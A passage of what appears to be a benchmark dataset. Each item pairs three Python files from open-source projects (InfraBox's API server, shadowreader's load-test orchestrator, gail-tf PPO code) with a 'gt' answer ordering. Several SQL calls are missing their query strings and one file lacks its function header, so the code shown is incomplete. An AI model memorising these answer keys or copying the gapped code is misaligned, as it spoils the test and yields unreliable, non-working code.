\"photo_url\": \"www.cdn.com/DerrickJohnson.png\",\n            \"metadata\": {\"department\": \"Design\", \"title\": \"Designer\", \"floor\": \"12\", \"desk\": \"102\", \"manager\": \"Derrick Johnson\"},\n        },\n    }\n\n\n@pytest.fixture\ndef fake_user(session):\n    yield _fake_user(session)\n\n\ndef _fake_user(session):\n    user_list = []\n    subscription = MeetingSubscription.query.first()\n    for user in FAKE_USER:\n        preferences = UserSubscriptionPreferences(preference=subscription.datetime[0], subscription=subscription, auto_opt_in=True)\n        session.add(preferences)\n        user_entity = User(\n            first_name=user[\"first_name\"],\n            last_name=user[\"last_name\"],\n            email=user[\"email\"],\n            photo_url=user[\"photo_url\"],\n            meta_data={\n                \"department\": user[\"department\"],\n                \"office\": \"USA: CA SF New Montgomery Office\",\n                \"company_profile_url\": \"https://www.yelp.com/user_details?userid=nkN_do3fJ9xekchVC-v68A\",\n            },\n            subscription_preferences=[preferences],\n        )\n        session.add(user_entity)\n        user_list.append(user_entity)\n    session.commit()\n    return user_list[0]\n\n\ndef create_dev_data(session):\n    email = FAKE_USER[0][\"email\"]\n    user = User.query.filter(User.email == email).first()\n    if not user:\n        _subscription(session)\n        time.sleep(2)\n        _fake_user(session)\n\n        subscription = MeetingSubscription.query.first()\n        week_start, specs = get_specs_from_subscription(subscription)\n        store_specs_from_subscription(subscription, week_start, specs)\n        logging.info(\"generated fake date for dev\")\n",
        "gt": [
            "'beans/api/factory.py'",
            "'beans/api/tests/conftest.py'",
            "'beans/api/main.py'"
        ]
    },
    {
        "files": [
            "'InfraBox/src/api/server.py'",
            "'InfraBox/src/api/listeners/job.py'",
            "'InfraBox/infrabox/test/api/temp_tools.py'"
        ],
        "content": "'InfraBox/src/api/server.py'\n:\nimport uuid\nimport os\nimport sys\n\n\nimport eventlet\neventlet.monkey_patch()\n\nimport urllib3\nimport flask_socketio\nimport socketio\n\nfrom flask import request, abort, g, jsonify\nfrom flask_restx import Resource\nfrom requests.exceptions import RequestException\n\nfrom pyinfraboxutils import get_env, get_logger\n\nfrom pyinfraboxutils.ibflask import get_token, normalize_token\nfrom pyinfraboxutils.ibrestplus import api, app\nfrom pyinfraboxutils.ibopa import opa_do_auth, opa_start_push_loop\nfrom pyinfraboxutils import dbpool\n\nimport handlers\nimport settings\nimport internal\n\nimport listeners.console\nimport listeners.job\n\n\nlogger = get_logger('api')\n\n@app.route('/ping')\n@app.route('/api/ping')\ndef ping():\n    return jsonify({'status': 200})\n\n@app.route('/api/status')\ndef status():\n    cluster_name = get_env(\"INFRABOX_CLUSTER_NAME\")\n    status = g.db.execute_one_dict(, [cluster_name])\n    if not status['active'] or not status['enabled']:\n        return jsonify(status), 503\n    return jsonify({'status': \"active\"})\n\nclass ClientManager(socketio.base_manager.BaseManager):\n    def __init__(self):\n        super(ClientManager, self).__init__()\n        self.__rooms = {}\n\n    def enter_room(self, sid, namespace, room):\n        super(ClientManager, self).enter_room(sid, namespace, room)\n        logger.debug('%s joined room %s', sid, room)\n\n        if room not in self.__rooms:\n            self.__rooms[room] = 0\n\n        self.__rooms[room] += 1\n\n    def leave_room(self, sid, namespace, room):\n        super(ClientManager, self).leave_room(sid, namespace, room)\n        logger.debug('%s left room %s', sid, room)\n        self.__rooms[room] -= 1\n\n        if not self.__rooms[room]:\n            del self.__rooms[room]\n\n    def has_clients(self, room):\n        clients = self.__rooms.get(room, None)\n\n        if clients:\n            return True\n\n        return False\n\ndef main():\n    get_env('INFRABOX_VERSION')\n    get_env('INFRABOX_DATABASE_HOST')\n    get_env('INFRABOX_DATABASE_USER')\n    get_env('INFRABOX_DATABASE_PASSWORD')\n    get_env('INFRABOX_DATABASE_PORT')\n    get_env('INFRABOX_DATABASE_DB')\n\n    get_env('INFRABOX_GENERAL_REPORT_ISSUE_URL')\n\n    if get_env('INFRABOX_STORAGE_GCS_ENABLED') == 'true':\n        get_env('GOOGLE_APPLICATION_CREDENTIALS')\n        get_env('INFRABOX_STORAGE_GCS_BUCKET')\n\n    if get_env('INFRABOX_STORAGE_S3_ENABLED') == 'true':\n        get_env('INFRABOX_STORAGE_S3_BUCKET')\n        get_env('INFRABOX_STORAGE_S3_REGION')\n\n    app.config['MAX_CONTENT_LENGTH'] = 1024 * 1024 * 1024 * 4\n    client_manager = ClientManager()\n    sio = flask_socketio.SocketIO(app,\n                                  path='/api/v1/socket.io',\n                                  async_mode='eventlet',\n                                  client_manager=client_manager)\n\n    urllib3.disable_warnings()\n\n    @sio.on('listen:jobs')\n    def __listen_jobs(project_id):\n        logger.debug('listen:jobs for %s', project_id)\n\n        if not project_id:\n            logger.debug('project_id not set')\n            return flask_socketio.disconnect()\n\n        if not sio_is_authorized([\"listen:jobs\", project_id]):\n            return flask_socketio.disconnect()\n\n        flask_socketio.join_room(project_id)\n\n    @sio.on('listen:build')\n    def __listen_build(build_id):\n        logger.debug('listen:build for %s', build_id)\n\n        if not build_id:\n            logger.debug('build_id not set')\n            return flask_socketio.disconnect()\n\n        try:\n            uuid.UUID(build_id)\n        except:\n            logger.debug('build_id not a uuid')\n            return flask_socketio.disconnect()\n\n        if not sio_is_authorized(['listen:build', build_id]):\n            return flask_socketio.disconnect()\n\n        conn = dbpool.get()\n        try:\n            token = normalize_token(get_token())\n\n            project_id = token['project']['id']\n\n            build = conn.execute_one(, [project_id, build_id])\n\n            if not build:\n                logger.debug('build does not belong to project')\n                return flask_socketio.disconnect()\n        except:\n            logger.exception(\"Exception occured\")\n            return flask_socketio.disconnect()\n        finally:\n            dbpool.put(conn)\n\n        flask_socketio.join_room(build_id)\n\n    @sio.on('listen:console')\n    def __listen_console(job_id):\n        logger.debug('listen:console for %s', job_id)\n\n        if not job_id:\n            logger.debug('job_id not set')\n            return flask_socketio.disconnect()\n\n        try:\n            uuid.UUID(job_id)\n        except:\n            logger.debug('job_id not a uuid')\n            return flask_socketio.disconnect()\n\n        if not sio_is_authorized(['listen:console', job_id]):\n            return flask_socketio.disconnect()\n\n        token = normalize_token(get_token())\n        conn = dbpool.get()\n        try:\n            project_id = token['project']['id']\n\n            build = conn.execute_one(, [project_id, job_id])\n\n            if not build:\n                logger.debug('job does not belong to project')\n                return flask_socketio.disconnect()\n        except:\n            logger.exception(\"Exception occured\")\n            return flask_socketio.disconnect()\n        finally:\n            dbpool.put(conn)\n\n        flask_socketio.join_room(job_id)\n\n    @sio.on('listen:dashboard-console')\n    def __listen_dashboard_console(job_id):\n        logger.debug('listen:dashboard-console for %s', job_id)\n\n        if not job_id:\n            logger.debug('job_id not set')\n            return flask_socketio.disconnect()\n\n        try:\n            uuid.UUID(job_id)\n        except:\n            logger.debug('job_id not a uuid')\n            return flask_socketio.disconnect()\n\n        conn = dbpool.get()\n        try:\n            u = conn.execute_one_dict(, [job_id])\n\n            if not u:\n                logger.warn('job not found')\n                return flask_socketio.disconnect()\n\n            if not sio_is_authorized(['listen:dashboard-console', u['project_id'], job_id]):\n                return flask_socketio.disconnect()\n\n        except:\n            logger.exception(\"Exception occured\")\n            return flask_socketio.disconnect()\n        finally:\n            dbpool.put(conn)\n\n        flask_socketio.join_room(job_id)\n\n    def sio_is_authorized(path):\n        g.db = dbpool.get()\n        try:\n\n            opa_input = {\n                \"input\": {\n                    \"method\": \"WS\",\n                    \"path\": path,\n                    \"token\": normalize_token(get_token())\n                }\n            }\n\n            authorized = opa_do_auth(opa_input)\n            if not authorized:\n                logger.warn(\"Unauthorized socket.io access attempt\")\n                return False\n            return True\n        except RequestException as e:\n            logger.error(e)\n            return False\n        finally:\n            dbpool.put(g.db)\n            g.db = None\n\n\n    logger.info('Starting DB listeners')\n    sio.start_background_task(listeners.job.listen, sio)\n    sio.start_background_task(listeners.console.listen, sio, client_manager)\n\n    logger.info('Starting repeated push of data to Open Policy Agent')\n    opa_start_push_loop()\n\n\n    port = int(os.environ.get('INFRABOX_PORT', 8080))\n    logger.info('Starting Server on port %s', port)\n    sio.run(app, host='0.0.0.0', port=port)\n\nif __name__ == \"__main__\":\n    main()\n\n'InfraBox/src/api/listeners/job.py'\n:import json\n\nfrom psycopg2.extensions import ISOLATION_LEVEL_AUTOCOMMIT\nfrom eventlet.hubs import trampoline\n\nfrom pyinfraboxutils import get_logger\nfrom pyinfraboxutils.db import connect_db\nfrom pyinfraboxutils import dbpool\n\nlogger = get_logger('job_listener')\n\ndef __handle_event(event, socketio):\n    job_id = event['job_id']\n\n    db = dbpool.get()\n\n    try:\n        job = db.execute_one_dict('''\n            SELECT id, state, to_char(start_date, 'YYYY-MM-DD HH24:MI:SS') start_date, type, dockerfile,\n                   to_char(end_date, 'YYYY-MM-DD HH24:MI:SS') end_date,\n                   name, dependencies, to_char(created_at, 'YYYY-MM-DD HH24:MI:SS') created_at, message,\n                   project_id, build_id, node_name, avg_cpu, definition, restarted\n            FROM job\n            WHERE id = %s\n        ''', [job_id])\n\n        if not job:\n            return\n\n        project_id = job['project_id']\n        build_id = job['build_id']\n\n        project = db.execute_one_dict(, [project_id])\n\n        if not project:\n            return\n\n        build = db.execute_one_dict(, [build_id])\n\n        commit_id = build['commit_id']\n\n        commit = None\n        pr = None\n        if project['type'] in ('gerrit', 'github'):\n            commit = db.execute_one_dict('''\n                SELECT\n                            c.id,\n                            split_part(c.message, '\\n', 1) as message,\n                            c.author_name,\n                            c.author_email,\n                            c.author_username,\n                            c.committer_name,\n                            c.committer_email,\n                            c.committer_username,\n                            c.url,\n                            c.branch,\n                            c.pull_request_id\n                FROM commit c\n                WHERE c.id = %s\n                AND   c.project_id = %s\n            ''', [commit_id, project_id])\n\n            pull_request_id = commit['pull_request_id']\n\n            pr = db.execute_one_dict(, [pull_request_id, project_id])\n\n    finally:\n        dbpool.put(db)\n\n    msg = {\n        'type': event['type'],\n        'data': {\n            'build': build,\n            'project': project,\n            'commit': commit,\n            'pull_request': pr,\n            'job': job\n        }\n    }\n\n    socketio.emit('notify:job', msg, room=build_id)\n    socketio.emit('notify:job', msg, room=project_id)\n\ndef listen(socketio):\n    while True:\n        try:\n            __listen(socketio)\n        except Exception as e:\n            logger.exception(e)\n\ndef __listen(socketio):\n    conn = connect_db()\n    conn.set_isolation_level(ISOLATION_LEVEL_AUTOCOMMIT)\n    cur = conn.cursor()\n    cur.execute(\"LISTEN job_update\")\n\n    while True:\n        trampoline(conn, read=True)\n        conn.poll()\n        while conn.notifies:\n            n = conn.notifies.pop()\n            socketio.start_background_task(__handle_event,\n                                           json.loads(n.payload),\n                                           socketio)\n\n'InfraBox/infrabox/test/api/temp_tools.py'\n:from os import remove\n\nimport json\n\nimport psycopg2\n\nfrom api import server\nfrom pyinfraboxutils.db import connect_db\nfrom pyinfraboxutils.token import encode_user_token, encode_project_token, encode_job_token\nfrom pyinfraboxutils.ibopa import opa_push_all\n\n\nclass TestUtils:\n\n    current_test_counter = 0\n\n    @staticmethod\n    def get_stream_file_size(result_stream):\n        file_size = 0\n\n        TestUtils.current_test_counter += 1\n        file_name = \"%s.tmp_test_file\" % TestUtils.current_test_counter\n\n        with open(file_name, \"wb\") as receive_cache:\n            receive_cache.write(result_stream)\n            file_size = receive_cache.tell()\n        remove(file_name)\n\n        return file_size\n\n\nclass TestClient:\n\n    app = server.app.test_client()\n    server.app.testing = True\n    conn = connect_db()\n\n    @staticmethod\n    def execute(stmt, args=None):\n        cur = TestClient.conn.cursor()\n        cur.execute(stmt, args)\n        cur.close()\n        TestClient.conn.commit()\n\n    @staticmethod\n    def execute_many(stmt, args=None):\n        cur = TestClient.conn.cursor(cursor_factory=psycopg2.extras.DictCursor)\n        cur.execute(stmt, args)\n        d = cur.fetchall()\n        cur.close()\n        TestClient.conn.commit()\n        return d\n\n    @staticmethod\n    def execute_one(stmt, args=None):\n        return TestClient.execute_many(stmt, args)[0]\n\n    @staticmethod\n    def get_user_authorization(user_id):\n        token = encode_user_token(user_id)\n        h = {'Authorization': 'token %s' % token}\n        return h\n\n    @staticmethod\n    def get_job_authorization(job_id):\n        job_api_token = encode_job_token(job_id)\n        h = {'Authorization': 'token %s' % job_api_token}\n        return h\n\n    @staticmethod\n    def get_project_authorization(token_id, project_id):\n        project_token = encode_project_token(token_id, project_id, 'myproject')\n        h = {'Authorization': 'token %s' % project_token}\n        return h\n\n    @staticmethod\n    def get(url, headers):\n\n        if not headers:\n            return\n\n        r = TestClient.app.get(url, headers=headers)\n\n        if r.mimetype == 'application/json':\n            j = json.loads(r.data)\n            return j\n\n        return r\n\n    @staticmethod\n    def delete(url, headers):\n\n        if not headers:\n            return\n\n        r = TestClient.app.delete(url, headers=headers)\n\n        if r.mimetype == 'application/json':\n            j = json.loads(r.data)\n            return j\n\n        return r\n\n    @staticmethod\n    def post(url, data, headers, content_type='application/json'):\n        if not headers:\n            return\n\n        if content_type == 'application/json':\n            data = json.dumps(data)\n\n        r = TestClient.app.post(url,\n                          data=data,\n                          headers=headers,\n                          content_type=content_type)\n\n        if r.mimetype == 'application/json':\n            j = json.loads(r.data)\n            return j\n\n        return r\n\n\n    @staticmethod\n    def opa_push():\n        opa_push_all()",
        "gt": [
            "'InfraBox/src/api/listeners/job.py'",
            "'InfraBox/src/api/server.py'",
            "'InfraBox/infrabox/test/api/temp_tools.py'"
        ]
    },
    {
        "files": [
            "'shadowreader/shadowreader/tests/integration/test_orchestrator_lambda.py'",
            "'shadowreader/shadowreader/functions/orchestrator_past.py'",
            "'shadowreader/shadowreader/libs/orchestrator.py'"
        ],
        "content": "'shadowreader/shadowreader/tests/integration/test_orchestrator_lambda.py'\n:\"\"\"\nCopyright 2018 Edmunds.com, Inc.\n\nLicensed under the Apache License, Version 2.0 (the \"License\");\nyou may not use this file except in compliance with the License.\nYou may obtain a copy of the License at\n\n    http://www.apache.org/licenses/LICENSE-2.0\n\nUnless required by applicable law or agreed to in writing, software\ndistributed under the License is distributed on an \"AS IS\" BASIS,\nWITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\nSee the License for the specific language governing permissions and\nlimitations under the License.\n\"\"\"\n\nfrom pytz import timezone\n\nfrom classes.mytime import MyTime\nfrom functions import orchestrator_past\n\nimport json\n\ndef test_orchestrator_lambda_handler(monkeypatch):\n    defaults = {\n        \"apps_to_test\": [\"test-app1\"],\n        \"test_params\": {\n            \"rate\": 23,\n            \"loop_duration\": 19,\n            \"replay_start_time\": \"2018-6-18-17-06\",\n            \"base_url\": \"http://shadowreader.example.com\",\n            \"identifier\": \"qa\",\n        },\n        \"overrides\": [\n            {\n                \"app\": \"test-app1\",\n                \"rate\": 50,\n                \"loop_duration\": 19,\n                \"replay_start_time\": \"2018-6-18-17-06\",\n                \"base_url\": \"http://shadowreader.example.com\",\n                \"identifier\": \"qa\",\n            }\n        ],\n        \"timezone\": \"US/Pacific\",\n    }\n    if monkeypatch:\n        monkeypatch.setattr(\"utils.conf.sr_plugins.exists\", lambda x: False)\n\n    cur_params, consumer_event = orchestrator_past.lambda_handler(defaults, {})\n    cur_params = json.loads(cur_params)\n    consumer_event = json.loads(consumer_event)\n    timestamp = consumer_event[\"cur_timestamp\"]\n\n    mytime = MyTime.set_to_replay_start_time_env_var(\n        defaults[\"test_params\"][\"replay_start_time\"], timezone(\"US/Pacific\")\n    )\n\n    rate = cur_params[\"test_params\"][\"rate\"]\n    assert rate == 23 and timestamp >= mytime.epoch\n    assert consumer_event[\"app\"] == defaults[\"apps_to_test\"][0]\n\n\nif __name__ == \"__main__\":\n    test_orchestrator_lambda_handler(None)\n\n'shadowreader/shadowreader/functions/orchestrator_past.py'\n:\"\"\"\nCopyright 2018 Edmunds.com, Inc.\n\nLicensed under the Apache License, Version 2.0 (the \"License\");\nyou may not use this file except in compliance with the License.\nYou may obtain a copy of the License at\n\n    http://www.apache.org/licenses/LICENSE-2.0\n\nUnless required by applicable law or agreed to in writing, software\ndistributed under the License is distributed on an \"AS IS\" BASIS,\nWITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\nSee the License for the specific language governing permissions and\nlimitations under the License.\n\n    First gather the necessary test params, init App objects, filters and compute the current step\n    After,\n    then send (app, env_to_test, cur_timestamp, rate) to consumer-master\n    consumer-master will then fetch data set (set of URLs) from S3, then pass it to multiple consumer-workers\n    each consumer-worker will then send out requests to test environment (each worker handles up to 100 requests)\n    \"\"\"\n\n    mytime, lambda_name, env_vars = lambda_init.init_lambda(context)\n    stage = env_vars[\"stage\"]\n    consumer_master_past_lambda = env_vars[\"consumer_master_past_name\"]\n\n    apps, test_params = init_apps_from_test_params(event)\n    filters = init_filters()\n\n    step = generate_step_from_mytime(mytime)\n\n    print(\"step:\", step)\n    for app in apps:\n        advance_app_timestamp(app, step)\n\n    consumer_event = {}\n\n\n    for app in apps:\n        headers = Headers(\n            shadowreader_type=\"past\", stage=stage, app=app, step=step\n        ).headers\n\n        consumer_event = {\n            \"app\": app.name,\n            \"identifier\": app.identifier,\n            \"base_url\": app.base_url,\n            \"cur_timestamp\": app.cur_timestamp,\n            \"rate\": app.rate,\n            \"baseline\": app.baseline,\n            \"parent_lambda\": lambda_name,\n            \"child_lambda\": consumer_master_past_lambda,\n            \"headers\": headers,\n            \"filters\": filters,\n        }\n        invoke_func(consumer_event, func=consumer_master_past_lambda)\n\n    if apps and consumer_event:\n        print_to_logs(consumer_event, apps)\n\n\n    metrics = []\n    for app in apps:\n\n\n        metric = {\n            \"name\": \"replayed_timestamp\",\n            \"stage\": stage,\n            \"lambda_name\": lambda_name,\n            \"app\": app.name,\n            \"identifier\": app.identifier,\n            \"mytime\": mytime,\n            \"val\": app.cur_timestamp,\n        }\n        metrics.append(metric)\n\n    if sr_plugins.exists(\"metrics\"):\n        metric_emitter = sr_plugins.load(\"metrics\")\n        for metric in metrics:\n            metric_emitter.main(metric)\n\n    cur_params = {\"apps\": apps, \"filters\": filters, \"test_params\": test_params}\n\n    if sr_plugins.exists(\"test_params_emitter\"):\n        params_emitter = sr_plugins.load(\"test_params_emitter\")\n        params_emitter.main(\n            cur_params,\n            lambda_name,\n            mytime,\n            stage,\n            env_vars,\n            sr_config,\n            sr_plugins._sr_plugins,\n        )\n\n    return json.dumps(cur_params, default=str), json.dumps(consumer_event, default=str)\n\n'shadowreader/shadowreader/libs/orchestrator.py'\n:\"\"\"\nCopyright 2018 Edmunds.com, Inc.\n\nLicensed under the Apache License, Version 2.0 (the \"License\");\nyou may not use this file except in compliance with the License.\nYou may obtain a copy of the License at\n\n    http://www.apache.org/licenses/LICENSE-2.0\n\nUnless required by applicable law or agreed to in writing, software\ndistributed under the License is distributed on an \"AS IS\" BASIS,\nWITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\nSee the License for the specific language governing permissions and\nlimitations under the License.\n\"\"\"\n\nimport json\nfrom pprint import pprint\nfrom typing import Tuple\nfrom os import getenv\n\nimport boto3\nfrom pytz import timezone\n\nfrom classes.app import App\nfrom classes.mytime import MyTime\nfrom libs.validate import validate_test_params, validate_timezone\nfrom utils.conf import sr_plugins, env_vars\nfrom classes.exceptions import InvalidTestParametersError\n\n\ndef init_apps_from_test_params(event: dict = None) -> Tuple[list, dict]:\n    apps_to_test, test_params, overrides, tzinfo = _get_env_vars(event)\n\n    _validate_params(\n        apps=apps_to_test, test_params=test_params, overrides=overrides, tzinfo=tzinfo\n    )\n\n    validate_timezone(tzinfo)\n\n    validate_test_params(test_params, tzinfo)\n\n    apps = _init_app_objs(apps_to_test, test_params, tzinfo)\n    override_apps = _init_overrides(overrides, tzinfo)\n\n    apps = _merge_app_dicts_to_list(apps, override_apps)\n    apps = _filter_out_apps_w_rate_zero(apps)\n\n    return apps, test_params\n\n\ndef _validate_params(**kwargs):\n    if sr_plugins.exists(\"test_params_validator\"):\n        validator = sr_plugins.load(\"test_params_validator\")\n        validator.main(**kwargs)\n\n\ndef _get_env_vars(event: dict):\n    defaults = _check_for_defaults(event)\n    env_vars = {}\n    env_vars_to_get = [\"apps_to_test\", \"test_params\", \"overrides\"]\n\n    for e in env_vars_to_get:\n        if defaults:\n            env_var = defaults[e]\n        else:\n            env_var = getenv(e, \"{}\")\n            env_var = json.loads(env_var)\n\n        env_vars[e] = env_var\n\n    if defaults:\n        tzinfo = getenv(\"timezone\", defaults[\"timezone\"])\n    else:\n        tzinfo = getenv(\"timezone\", \"UTC\")\n\n    return (\n        env_vars[\"apps_to_test\"],\n        env_vars[\"test_params\"],\n        env_vars[\"overrides\"],\n        tzinfo,\n    )\n\n\ndef _check_for_defaults(event):\n    if isinstance(event, dict) and \"apps_to_test\" in event:\n        return event\n    else:\n        return None\n\n\ndef _init_app_objs(apps_to_test: list, test_params: dict, tzinfo: timezone):\n    apps = {}\n\n    for app_name in apps_to_test:\n        app = _init_app_obj_from_params(app_name, test_params, tzinfo)\n        apps[app_name] = app\n\n    return apps\n\n\ndef _init_app_obj_from_params(app_name: str, params: dict, tzinfo: timezone) -> App:\n    \"\"\"\n    \"rate\": 50,\n    \"loop_duration\": 60,\n    \"replay_start_time\": \"2018-3-26-12-30\",\n    \"base_url\": \"https://www.my-website.com\",\n    \"identifier\": \"qa\",\n    \"env_to_test\": \"qa\"\n    \"\"\"\n    rate = params[\"rate\"]\n    if \"baseline\" in params:\n        baseline = params[\"baseline\"]\n    else:\n        baseline = 0\n\n    base_url = params[\"base_url\"]\n\n    identifier = params[\"identifier\"] if \"identifier\" in params else \"\"\n\n    replay_duration, replay_start_time = determine_replay_time_window(params, tzinfo)\n\n    return App(\n        name=app_name,\n        replay_start_time=replay_start_time,\n        loop_duration=replay_duration,\n        base_url=base_url,\n        rate=rate,\n        baseline=baseline,\n        identifier=identifier,\n    )\n\n\ndef determine_replay_time_window(params: dict, tzinfo: str) -> Tuple[int, MyTime]:\n    replay_start_time = params[\"replay_start_time\"]\n    replay_start_time = MyTime.set_to_replay_start_time_env_var(\n        replay_start_time, tzinfo\n    )\n    if \"loop_duration\" in params:\n        replay_duration = params[\"loop_duration\"]\n\n    elif \"replay_end_time\" in params:\n        replay_end_time = MyTime.set_to_replay_start_time_env_var(\n            params[\"replay_end_time\"], tzinfo\n        )\n        time_diff = replay_end_time.dt - replay_start_time.dt\n        replay_duration = int(time_diff.total_seconds() // 60)\n    else:\n        raise InvalidTestParametersError(\n            \"Must set either loop_duration or replay_end_time in test_params\"\n        )\n\n    return replay_duration, replay_start_time\n\n\ndef _init_overrides(overrides: dict, tzinfo: timezone) -> dict:\n    apps = {}\n    for override in overrides:\n        app_name = override[\"app\"]\n        app = _init_app_obj_from_params(app_name, override, tzinfo)\n        apps[app_name] = app\n    return apps\n\n\ndef _merge_app_dicts_to_list(apps: dict, override_apps: dict) -> list:\n    for app, params in override_apps.items():\n        if app in apps:\n            apps[app] = params\n\n    return list(apps.values())\n\n\ndef _filter_out_apps_w_rate_zero(apps: list) -> list:\n    return [app for app in apps if app.rate > 0]\n\n\ndef init_filters():\n\n    defaults = '{\"app\": \"*\", \"uri\": \"*\", \"status\": [200, 300, 400, 500], \"apply_filter\": false}'\n    filters = json.loads(getenv(\"filters\", defaults))\n    return filters\n\n\ndef choose_projection_rate(projection, steps):\n    size = len(projection)\n    step = steps % size\n    rate = projection[step]\n\n    return rate * 100\n\n\ndef advance_app_timestamp(app, step):\n    if app.loop_duration == 0:\n        return app\n\n    try:\n        app.cur_timestamp = app.cur_timestamp + (step % app.loop_duration) * 60\n    except ArithmeticError as e:\n        raise ArithmeticError(\n            f\"{type(e)}, {e}: app.cur_timestamp = {app.cur_timestamp} + ({step} % {app.loop_duration}) * 60\"\n        )\n    return app\n\n\ndef invoke_func(event, func):\n    cl = boto3.client(\"lambda\", region_name=env_vars[\"region\"])\n    args = json.dumps(event)\n    resp = cl.invoke_async(FunctionName=func, InvokeArgs=args)\n    return resp\n\n\ndef generate_step_from_mytime(mytime) -> int:\n    mytime = mytime.set_seconds_to_zero()\n    m = mytime.epoch % 1508201100\n    step = m // 60\n    return step\n\n\ndef print_to_logs(consumer_event, apps):\n    if consumer_event and apps:\n        msg = \"\\n\".join([x.name for x in apps])\n        print(f\"Invoke consumer-master-past for: {len(apps)} apps\\n{msg}\")\n        print(\"Sample consumer_event:\")\n        pprint(consumer_event)\n",
        "gt": [
            "'shadowreader/shadowreader/libs/orchestrator.py'",
            "'shadowreader/shadowreader/functions/orchestrator_past.py'",
            "'shadowreader/shadowreader/tests/integration/test_orchestrator_lambda.py'"
        ]
    },
    {
        "files": [
            "'gail-tf/gailtf/baselines/ppo1/run_mujoco.py'",
            "'gail-tf/gailtf/baselines/ppo1/mlp_policy.py'",
            "'gail-tf/gailtf/baselines/common/mpi_running_mean_std.py'"
        ],
        "content": "'gail-tf/gailtf/baselines/ppo1/run_mujoco.py'\n:\nfrom gailtf.baselines.common import set_global_seeds, tf_util as U\nfrom gailtf.baselines import bench\nimport os.path as osp\nimport gym, logging\nfrom gailtf.baselines import logger\nimport ipdb\n\ndef train(args):\n    from gailtf.baselines.ppo1 import mlp_policy, pposgd_simple\n    U.make_session(num_cpu=args.num_cpu).__enter__()\n    set_global_seeds(args.seed)\n    env = gym.make(args.env_id)\n    def policy_fn(name, ob_space, ac_space):\n        return mlp_policy.MlpPolicy(name=name, ob_space=ob_space, ac_space=ac_space,\n            hid_size=64, num_hid_layers=2)\n    env = bench.Monitor(env, logger.get_dir() and\n        osp.join(logger.get_dir(), \"monitor.json\"))\n    env.seed(args.seed)\n    gym.logger.setLevel(logging.WARN)\n    task_name = \"ppo.\" + args.env_id.split(\"-\")[0] + \".\" + (\"%.2f\"%args.entcoeff)\n    args.checkpoint_dir = osp.join(args.checkpoint_dir, task_name)\n    pposgd_simple.learn(env, policy_fn,\n            max_timesteps=args.num_timesteps,\n            timesteps_per_batch=2048,\n            clip_param=0.2, entcoeff=args.entcoeff,\n            optim_epochs=10, optim_stepsize=3e-4, optim_batchsize=64,\n            gamma=0.99, lam=0.95, schedule='linear', ckpt_dir=args.checkpoint_dir,\n            save_per_iter=args.save_per_iter, task=args.task,\n            sample_stochastic=args.sample_stochastic,\n            load_model_path=args.load_model_path,\n            task_name=task_name\n        )\n    env.close()\n\ndef main():\n    import argparse\n    parser = argparse.ArgumentParser(formatter_class=argparse.ArgumentDefaultsHelpFormatter)\n    parser.add_argument('--env_id', help='environment ID', default='Hopper-v1')\n    parser.add_argument('--seed', help='RNG seed', type=int, default=0)\n    parser.add_argument('--task', help='Choose to do which task', type=str, choices=['train', 'sample_trajectory'], default='train')\n    parser.add_argument('--sample_stochastic', type=bool, default=False)\n    parser.add_argument('--num_cpu', help='number of cpu to used', type=int, default=1)\n    parser.add_argument('--entcoeff', help='entropy coefficiency', type=float, default=0)\n    parser.add_argument('--save_per_iter', help='save model every xx iterations', type=int, default=100)\n    parser.add_argument('--num_timesteps', help='number of timesteps per episode', type=int, default=1e6)\n    parser.add_argument('--checkpoint_dir', help='the directory to save model', default='checkpoint')\n    parser.add_argument('--load_model_path', help='if provided, load the model', type=str, default=None)\n    args = parser.parse_args()\n    train(args)\n\n\nif __name__ == '__main__':\n    main()\n\n'gail-tf/gailtf/baselines/ppo1/mlp_policy.py'\n:from gailtf.baselines.common.mpi_running_mean_std import RunningMeanStd\nimport gailtf.baselines.common.tf_util as U\nimport tensorflow as tf\nimport gym\nfrom gailtf.baselines.common.distributions import make_pdtype\n\nclass MlpPolicy(object):\n    recurrent = False\n    def __init__(self, name, reuse=False, *args, **kwargs):\n        with tf.variable_scope(name):\n            if reuse:\n                tf.get_variable_scope().reuse_variables()\n            self._init(*args, **kwargs)\n            self.scope = tf.get_variable_scope().name\n\n    def _init(self, ob_space, ac_space, hid_size, num_hid_layers, gaussian_fixed_var=True):\n        assert isinstance(ob_space, gym.spaces.Box)\n\n        self.pdtype = pdtype = make_pdtype(ac_space)\n        sequence_length = None\n\n        ob = U.get_placeholder(name=\"ob\", dtype=tf.float32, shape=[sequence_length] + list(ob_space.shape))\n\n        with tf.variable_scope(\"obfilter\"):\n            self.ob_rms = RunningMeanStd(shape=ob_space.shape)\n\n        obz = tf.clip_by_value((ob - self.ob_rms.mean) / self.ob_rms.std, -5.0, 5.0)\n        last_out = obz\n        for i in range(num_hid_layers):\n            last_out = tf.nn.tanh(U.dense(last_out, hid_size, \"vffc%i\"%(i+1), weight_init=U.normc_initializer(1.0)))\n        self.vpred = U.dense(last_out, 1, \"vffinal\", weight_init=U.normc_initializer(1.0))[:,0]\n\n        last_out = obz\n        for i in range(num_hid_layers):\n            last_out = tf.nn.tanh(U.dense(last_out, hid_size, \"polfc%i\"%(i+1), weight_init=U.normc_initializer(1.0)))\n        if gaussian_fixed_var and isinstance(ac_space, gym.spaces.Box):\n            mean = U.dense(last_out, pdtype.param_shape()[0]//2, \"polfinal\", U.normc_initializer(0.01))\n            logstd = tf.get_variable(name=\"logstd\", shape=[1, pdtype.param_shape()[0]//2], initializer=tf.zeros_initializer())\n            pdparam = U.concatenate([mean, mean * 0.0 + logstd], axis=1)\n        else:\n            pdparam = U.dense(last_out, pdtype.param_shape()[0], \"polfinal\", U.normc_initializer(0.01))\n\n        self.pd = pdtype.pdfromflat(pdparam)\n\n        self.state_in = []\n        self.state_out = []\n\n\n\n        stochastic = U.get_placeholder(name=\"stochastic\", dtype=tf.bool, shape=())\n        ac = U.switch(stochastic, self.pd.sample(), self.pd.mode())\n        self.ac = ac\n        self._act = U.function([stochastic, ob], [ac, self.vpred])\n\n    def act(self, stochastic, ob):\n        ac1, vpred1 =  self._act(stochastic, ob[None])\n        return ac1[0], vpred1[0]\n    def get_variables(self):\n        return tf.get_collection(tf.GraphKeys.GLOBAL_VARIABLES, self.scope)\n    def get_trainable_variables(self):\n        return tf.get_collection(tf.GraphKeys.TRAINABLE_VARIABLES, self.scope)\n    def get_initial_state(self):\n        return []\n\n\n'gail-tf/gailtf/baselines/common/mpi_running_mean_std.py'\n:from 